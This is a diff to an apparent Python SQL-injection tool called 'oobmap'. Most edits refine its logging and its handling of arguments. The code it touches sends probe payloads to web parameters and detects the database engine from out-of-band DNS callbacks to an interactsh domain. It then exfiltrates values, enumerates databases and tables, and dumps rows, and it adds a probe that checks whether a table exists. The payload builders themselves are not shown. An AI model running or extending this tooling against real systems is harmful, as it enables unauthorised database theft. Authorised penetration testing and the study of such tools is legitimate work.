@@ -27,21 +27,23 @@ def _ts() -> str:
 
 
 _LEVEL_COLORS = {
-    "INFO":    "\033[1;34m",   # bold blue
-    "WARNING": "\033[1;33m",   # bold yellow
-    "ERROR":   "\033[1;31m",   # bold red
-    "DEBUG":   "\033[0;90m",   # dark grey
-    "SUCCESS": "\033[1;92m",   # bold bright green
+    "INFO":     "\033[1;34m",   # bold blue
+    "WARNING":  "\033[1;33m",   # bold yellow
+    "ERROR":    "\033[1;31m",   # bold red
+    "CRITICAL": "\033[1;91m",   # bold bright red
+    "DEBUG":    "\033[0;90m",   # dark grey
+    "SUCCESS":  "\033[1;92m",   # bold bright green
 }
+_TS_COLOR = "\033[0;36m"        # cyan — timestamp digits only
 _RESET = "\033[0m"
 
 
 def _log(level: str, msg: str, *, err: bool = False) -> None:
     fd = sys.stderr if err else sys.stdout
     if fd.isatty():
-        ts  = f"\033[0;90m[{_ts()}]\033[0m"   # dark grey timestamp
+        ts  = f"[{_TS_COLOR}{_ts()}{_RESET}]"
         color = _LEVEL_COLORS.get(level, "")
-        tag = f"{color}[{level}]{_RESET}"
+        tag = f"[{color}{level}{_RESET}]"
     else:
         ts  = f"[{_ts()}]"
         tag = f"[{level}]"
@@ -164,11 +166,11 @@ def run_check(args, profile, request, domain, log, run_id) -> int:
     true_payload = profile.payload(args.base, args.true_condition, f"{true_token}.{domain}")
     false_payload = profile.payload(args.base, args.false_condition, f"{false_token}.{domain}")
 
-    _log("INFO", "sending true probe …")
+    _log("INFO", "Sending true probe...")
     send_payload(args, request, true_payload)
     true_hit = log.wait_any({true_token: "true"}, args.timeout)
 
-    _log("INFO", "sending false probe …")
+    _log("INFO", "Sending false probe...")
     send_payload(args, request, false_payload)
     false_hit = log.wait_any({false_token: "false"}, args.timeout)
 
@@ -176,9 +178,9 @@ def run_check(args, profile, request, domain, log, run_id) -> int:
         _log("INFO", _hi("OOB condition confirmed ✓"))
         return 0
     if true_hit and false_hit:
-        _log("WARNING", "both probes triggered — OOB capable but not conditional")
+        _log("WARNING", "Both probes triggered — OOB capable but not conditional")
         return 2
-    _log("WARNING", "no reliable conditional OOB behavior detected")
+    _log("WARNING", "No reliable conditional OOB behavior detected")
     return 1
 
 
@@ -189,7 +191,7 @@ def check(args) -> int:
             rc = run_check(args, profile, request, domain, log, run_id)
             status = "confirmed" if rc == 0 else "conditional-failed" if rc == 2 else "not-confirmed"
             session.save_check(session.check_id(args.dbms, args.place, args.param), args.dbms, args.place, args.param, status)
-            _log("INFO", f"session: {session.path}")
+            _log("INFO", f"Session: {session.path}")
             return rc
         finally:
             session.close()
@@ -205,11 +207,11 @@ def check(args) -> int:
     session = SessionStore(args.output_dir, request, args.force_ssl, flush=args.flush_session)
     points = injection_points(request, args.level)
     if not points:
-        _log("WARNING", "no injection points found at this level")
+        _log("WARNING", "No injection points found at this level")
         session.close()
         return 1
 
-    _log("INFO", f"scanning {len(points)} injection point(s)  level={args.level}")
+    _log("INFO", f"Scanning {len(points)} injection point(s) (level={args.level})")
     found = False
     for point in points:
         candidate_args = copy.copy(args)
@@ -222,12 +224,12 @@ def check(args) -> int:
         status = "confirmed" if rc == 0 else "conditional-failed" if rc == 2 else "not-confirmed"
         session.save_check(session.check_id(args.dbms, point.place, point.name), args.dbms, point.place, point.name, status)
         if rc == 0:
-            _log("INFO", _hi(f"injectable OOB point: --place {point.place} -p {point.name}"))
+            _log("INFO", _hi(f"Injectable OOB point: --place {point.place} -p {point.name}"))
             found = True
             if args.first:
                 break
 
-    _log("INFO", f"session: {session.path}")
+    _log("INFO", f"Session: {session.path}")
     session.close()
     return 0 if found else 1
 
@@ -269,10 +271,10 @@ def _extract_value_parallel(args, profile, request, domain, log, run_id, session
             extraction_id, args.dbms, args.place, args.param,
             expression, alphabet, result, False,
         )
-        _log("INFO", f"pos {pos:02d}: {char}  {result}")
+        _log("INFO", f"Pos {pos:02d}: {char}  {result}")
 
     print()
-    _log("INFO", f"done  {_hi(result)}")
+    _log("INFO", f"Extracted: {_hi(result)}")
     session.save_extraction(
         extraction_id, args.dbms, args.place, args.param,
         expression, alphabet, result, True,
@@ -288,7 +290,7 @@ def _try_direct_extract(args, profile, request, domain, log, run_id, expression)
     if payload is None:
         return None
 
-    _log("INFO", "trying direct exfiltration (full value in one DNS hit)")
+    _log("INFO", "Trying direct exfiltration (full value in one DNS hit)...")
     tamper_names = [t.strip() for t in getattr(args, "tamper", "").split(",") if t.strip()]
     if tamper_names:
         payload = apply_tampers(payload, tamper_names)
@@ -303,13 +305,13 @@ def _try_direct_extract(args, profile, request, domain, log, run_id, expression)
 
     value = log.find_direct(prefix, args.timeout)
     if value is not None:
-        _log("INFO", _hi(f"direct exfil: {value}"))
+        _log("INFO", _hi(f"Direct: {value}"))
     else:
-        _log("DEBUG", "no direct callback — falling back to char-by-char")
+        _log("DEBUG", "No direct callback — falling back to char-by-char")
     return value
 
 
-def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
+def extract_value(args, expression: str, alphabet: str, max_len: int, show_card: bool = True) -> str:
     profile, request, domain, log, run_id, session = load_common(args)
     extraction_id = session.extraction_id(args.dbms, args.place, args.param, expression, alphabet)
     cached = None if args.fresh_queries else session.get_extraction(extraction_id)
@@ -317,24 +319,25 @@ def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
     start_pos = 1
 
     if cached and cached["completed"]:
-        _log("INFO", f"resumed completed value from session: {_hi(cached['value'])}")
+        _log("INFO", f"Resumed from session: {_hi(cached['value'])}")
         session.close()
         return cached["value"]
 
     if cached and cached["value"]:
         result = cached["value"]
         start_pos = len(result) + 1
-        _log("INFO", f"resuming from session at pos {start_pos}: {result}")
+        _log("INFO", f"Resuming from pos {start_pos}: {result}")
 
-    _sep()
-    print(f"  profile   {profile.name}  |  run {run_id}")
-    print(f"  [~] {profile.comment}")
-    print(f"  expr      {expression}")
-    print(f"  domain    {domain}")
-    print(f"  watching  {', '.join(args.log)}")
-    print(f"  session   {session.path}")
-    _sep()
-    print()
+    if show_card:
+        _sep()
+        print(f"  profile   {profile.name}  |  run {run_id}")
+        print(f"  [~] {profile.comment}")
+        print(f"  expr      {expression}")
+        print(f"  domain    {domain}")
+        print(f"  watching  {', '.join(args.log)}")
+        print(f"  session   {session.path}")
+        _sep()
+        print()
 
     # Try direct exfiltration first (only when starting fresh, not resuming)
     if start_pos == 1:
@@ -343,7 +346,8 @@ def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
             session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, direct, True)
             session.close()
             return direct
-        print()
+        if show_card:
+            print()
 
     if getattr(args, "threads", 1) > 1:
         result = _extract_value_parallel(
@@ -369,17 +373,17 @@ def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
 
         if not char:
             print()
-            _log("INFO", f"done  {_hi(result)}")
+            _log("INFO", f"Extracted: {_hi(result)}")
             session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, True)
             session.close()
             return result
 
         result += char
         session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, False)
-        _log("INFO", f"pos {pos:02d}: {char}  {result}")
+        _log("INFO", f"Pos {pos:02d}: {char}  {result}")
 
     print()
-    _log("WARNING", f"reached max-len  {_hi(result)}")
+    _log("WARNING", f"Max length reached: {_hi(result)}")
     session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, False)
     session.close()
     return result
@@ -401,20 +405,30 @@ def dump(args) -> int:
     columns = [column.strip() for column in args.column.split(",") if column.strip()] if args.column else []
     columns = validate_dump_target(args, dbms, columns)
 
-    _log("INFO", f"dumping {args.table} — columns: {', '.join(columns)}")
+    _log("INFO", f"Dumping {args.table} — columns: {', '.join(columns)}")
     if args.database:
-        _log("INFO", f"database/schema: {args.database}")
+        _log("INFO", f"Database/schema: {args.database}")
     if args.where:
-        _log("INFO", f"where: {args.where}")
+        _log("INFO", f"Where: {args.where}")
+
+    profile = PROFILES[args.dbms]
+    domain = normalize_domain(args.domain)
+    _sep()
+    print(f"  profile   {profile.name}")
+    print(f"  [~] {profile.comment}")
+    print(f"  table     {args.table} ({', '.join(columns)})")
+    print(f"  domain    {domain}")
+    print(f"  watching  {', '.join(args.log)}")
+    _sep()
+    print()
 
     rows = []
     for index in range(args.limit):
         expr = dbms.dump_expression(args.table, columns, index, args.where, args.database)
-        print()
-        _log("INFO", f"row {index}: {expr}")
-        value = extract_value(args, expr, args.alphabet, args.max_len)
+        _log("INFO", f"Extracting row {index + 1}...")
+        value = extract_value(args, expr, args.alphabet, args.max_len, show_card=False)
         if not value:
-            _log("INFO", f"no more rows at index {index}")
+            _log("INFO", "No more rows")
             break
         row = split_dump_row(value, len(columns))
         rows.append(row)
@@ -426,11 +440,11 @@ def dump(args) -> int:
 
         if args.output_file:
             Path(args.output_file).write_text(output, encoding="utf-8")
-            _log("INFO", f"saved to {args.output_file}", err=True)
+            _log("INFO", f"Saved to {args.output_file}", err=True)
         else:
             if args.output_format == "table":
                 print()
-                _log("INFO", "dump result")
+                _log("INFO", "Dump result")
             print(output)
     return 0
 
@@ -512,7 +526,7 @@ def enum(args) -> int:
             values = enumerate_rows(args, "database", lambda index: dbms.dbs_expression(index))
             save_catalog_values(args, "dbs", values)
             if values:
-                _log("INFO", f"databases: {', '.join(values)}")
+                _log("INFO", f"Databases: {', '.join(values)}")
             continue
         if key == "tables":
             values = enumerate_rows(args, "table", lambda index: dbms.table_expression(index, args.database))
@@ -534,7 +548,7 @@ def enum(args) -> int:
             _log("WARNING", f"{key} is not implemented for {args.dbms}")
         else:
             print()
-            _log("INFO", f"enum {key}: {expr}")
+            _log("INFO", f"Enumerating {key}...")
             value = extract_value(args, expr, args.alphabet, args.max_len)
             _log("INFO", f"{key}: {_hi(value)}")
     return 0
@@ -543,7 +557,7 @@ def enum(args) -> int:
 def enumerate_rows(args, label: str, expression_builder) -> list[str]:
     values = []
     print()
-    _log("INFO", f"enum {label}s")
+    _log("INFO", f"Enumerating {label}s...")
     limit = getattr(args, "_catalog_limit", args.limit)
     for index in range(limit):
         try:
@@ -552,14 +566,22 @@ def enumerate_rows(args, label: str, expression_builder) -> list[str]:
             _log("WARNING", str(exc))
             return values
 
-        _log("INFO", f"{label} index {index}: {expr}")
-        value = extract_value(args, expr, args.alphabet, args.max_len)
+        value = extract_value(args, expr, args.alphabet, args.max_len, show_card=False)
         if not value:
-            _log("INFO", f"no more {label}s at index {index}")
+            _log("INFO", f"No more {label}s")
             break
         values.append(value)
         _log("INFO", f"{label}[{index}]: {_hi(value)}")
     return values
+
+
+def _table_exists(args, profile, request, domain, log, run_id, table: str) -> bool:
+    """Fire one OOB probe to check if a table exists — no full enumeration."""
+    condition = f"(SELECT COUNT(*) FROM {table})>=0"
+    token = f"{run_id}-tblchk-{table}"
+    payload = profile.payload(args.base or "", condition, f"{token}.{domain}")
+    send_payload(args, request, payload)
+    return log.wait_any({token: table}, args.timeout) is not None
 
 
 def validate_dump_target(args, dbms, columns: list[str]) -> list[str]:
@@ -568,12 +590,10 @@ def validate_dump_target(args, dbms, columns: list[str]) -> list[str]:
             raise SystemExit("dump without -C/--column requires validation/enumeration; keep --validate enabled or provide -C")
         return columns
 
-    tables = get_or_enumerate_catalog(args, "tables", lambda index: dbms.table_expression(index, args.database))
-    if args.table not in tables and args.table.upper() not in [table.upper() for table in tables]:
-        raise SystemExit(
-            f"table not confirmed in current session/catalog: {args.table}. "
-            "Try --fresh-queries, adjust -D/--database, or run enum --tables."
-        )
+    profile, request, domain, log, run_id, session = load_common(args)
+    session.close()
+    if not _table_exists(args, profile, request, domain, log, run_id, args.table):
+        raise SystemExit(f"[ERROR] table not found: {args.table}")
 
     known_columns = get_or_enumerate_catalog(
         args,
@@ -584,7 +604,7 @@ def validate_dump_target(args, dbms, columns: list[str]) -> list[str]:
     if not columns:
         if not known_columns:
             raise SystemExit(f"no columns discovered for table: {args.table}")
-        _log("INFO", f"auto-selected columns from catalog: {', '.join(known_columns)}")
+        _log("INFO", f"Auto-selected columns: {', '.join(known_columns)}")
         return known_columns
 
     known_upper = {column.upper() for column in known_columns}
@@ -607,7 +627,7 @@ def get_or_enumerate_catalog(args, kind: str, expression_builder, table: str | N
     finally:
         session.close()
     if cached is not None:
-        _log("INFO", f"using cached {kind}: {', '.join(cached) if cached else '(empty)'}")
+        _log("INFO", f"Using cached {kind}: {', '.join(cached) if cached else '(empty)'}")
         return cached
 
     label = "table" if kind == "tables" else f"column({table})"
@@ -641,6 +661,35 @@ _ENUM_KEYS = ("dbs", "banner", "current_user", "current_db", "tables", "columns"
 # Primary profiles tried during DBMS auto-detection (one per engine, most common first)
 _DETECT_ORDER = ["mysql", "mssql", "postgres-program", "oracle-http", "sqlite-lab"]
 
+# Human-readable DBMS name for each profile (used in log output only)
+_DBMS_DISPLAY = {
+    "mysql":            "MySQL",
+    "mysql-stacked":    "MySQL",
+    "mssql":            "Microsoft SQL Server",
+    "mssql-cmdshell":   "Microsoft SQL Server",
+    "postgres-program": "PostgreSQL",
+    "postgres-dblink":  "PostgreSQL",
+    "oracle-http":      "Oracle",
+    "sqlite-lab":       "SQLite",
+    "sqlite-http":      "SQLite",
+}
+
+# Alias map: accepts shorthand/case-insensitive names → canonical profile
+_DBMS_ALIASES = {
+    "sqlite":     "sqlite-lab",
+    "postgres":   "postgres-program",
+    "postgresql": "postgres-program",
+    "oracle":     "oracle-http",
+    "sqlserver":  "mssql",
+    "mariadb":    "mysql",
+}
+
+
+def _resolve_dbms(value: str) -> str:
+    """Normalize --dbms: lowercase + alias resolution. Returns the canonical profile name."""
+    low = value.lower()
+    return _DBMS_ALIASES.get(low, low)
+
 
 def _detect_dbms(args) -> str | None:
     request = parse_raw_request(args.request)
@@ -649,8 +698,21 @@ def _detect_dbms(args) -> str | None:
     run_id = args.run_id or uuid.uuid4().hex[:6]
     tamper_names = [t.strip() for t in getattr(args, "tamper", "").split(",") if t.strip()]
 
+    if not args.param:
+        points = injection_points(request, level=args.level)
+        if not points:
+            raise SystemExit(
+                f"[ERROR] no injection points found at level {args.level} (query/body/JSON).\n"
+                "        Use --level 2 (cookies), --level 3 (common headers),\n"
+                "        or specify the parameter directly with --param <name>."
+            )
+        args.param = points[0].name
+        args.place = points[0].place
+        _log("INFO", f"Auto-selected injection point: {args.param} ({args.place})")
+
     candidates = [p for p in _DETECT_ORDER if p in PROFILES]
-    _log("INFO", f"--dbms not set — probing {len(candidates)} engines: {', '.join(candidates)}")
+    display_names = list(dict.fromkeys(_DBMS_DISPLAY.get(p, p) for p in candidates))
+    _log("INFO", f"DBMS not specified — probing {len(display_names)} engines: {', '.join(display_names)}")
 
     for profile_name in candidates:
         profile = PROFILES[profile_name]
@@ -674,9 +736,10 @@ def _detect_dbms(args) -> str | None:
 
         hit = log.wait_any({token: profile_name}, args.timeout)
         if hit:
-            _log("INFO", _hi(f"identified DBMS: {profile_name}"))
+            display = _DBMS_DISPLAY.get(profile_name, profile_name)
+            _log("INFO", _hi(f"identified DBMS: {display}"))
             return profile_name
-        _log("DEBUG", f"no callback — {profile_name}")
+        _log("DEBUG", f"No callback — {_DBMS_DISPLAY.get(profile_name, profile_name)}")
 
     return None
 
@@ -693,7 +756,7 @@ def run(args) -> int:
         _log("WARNING", f"{missing} is required", err=True)
         _log("INFO",
              "launch interactsh client first:\n\n"
-             "    interactsh-client -json-output interactsh.jsonl\n\n"
+             "    interactsh-client -json -o interactsh.jsonl\n\n"
              "  then run oobmap with:\n"
              "    --domain <your-cid>.oast.site --log interactsh.jsonl",
              err=True)
@@ -706,8 +769,14 @@ def run(args) -> int:
                 "could not auto-detect DBMS — no OOB callback received for any engine. "
                 "Specify --dbms explicitly or check your --domain/--log setup."
             )
+    elif args.dbms not in PROFILES:
+        raise SystemExit(
+            f"[ERROR] unknown --dbms value: '{args.dbms}'. "
+            f"Valid profiles: {', '.join(sorted(PROFILES))}. "
+            "Aliases accepted: sqlite, postgres, oracle, sqlserver, mariadb."
+        )
 
-    is_enum = any(getattr(args, k, False) for k in _ENUM_KEYS)
+    is_enum = any(getattr(args, k, False) for k in _ENUM_KEYS) or getattr(args, "dump", False)
     if args.alphabet is None:
         args.alphabet = ENUM_ALPHABET if is_enum else DEFAULT_ALPHABET
     if args.max_len is None:
@@ -758,6 +827,17 @@ def _starting_line() -> str:
     return f"{star} starting @ {ts} /{date}/\n"
 
 
+def _ending_line() -> str:
+    now = datetime.datetime.now()
+    ts   = now.strftime("%H:%M:%S")
+    date = now.strftime("%Y-%m-%d")
+    if sys.stdout.isatty():
+        star = "\033[1;36m[*]\033[0m"
+    else:
+        star = "[*]"
+    return f"\n{star} ending @ {ts} /{date}/\n"
+
+
 class _Formatter(argparse.RawDescriptionHelpFormatter):
     def _format_usage(self, usage, actions, groups, prefix):
         return f"Usage: {self._prog} [options]\n\n"
@@ -785,8 +865,9 @@ def make_parser():
         default="auto",
         help="injection place (default: auto); json targets a dotted JSONPath e.g. user.name",
     )
-    tgt.add_argument("--dbms", choices=sorted(PROFILES),
-                     help="OOB payload profile — run 'oobmap profiles' for descriptions")
+    tgt.add_argument("--dbms", type=_resolve_dbms, metavar="DBMS",
+                     help=f"target DBMS — profiles: {', '.join(sorted(PROFILES))}; "
+                          "aliases: sqlite, postgres, oracle, sqlserver, mariadb (case-insensitive)")
     tgt.add_argument("-D", "--database", help="database/schema/catalog for metadata and dump queries")
 
     oob = parser.add_argument_group("OOB callback")
@@ -899,10 +980,12 @@ def main(argv=None):
         return 0
     print(_starting_line(), flush=True)
     try:
-        return args.func(args)
+        rc = args.func(args)
+        print(_ending_line(), flush=True)
+        return rc
     except KeyboardInterrupt:
-        print()
-        _log("WARNING", "interrupted", err=True)
+        print(_ending_line(), flush=True)
+        _log("WARNING", "Interrupted", err=True)
         return 130
 
 
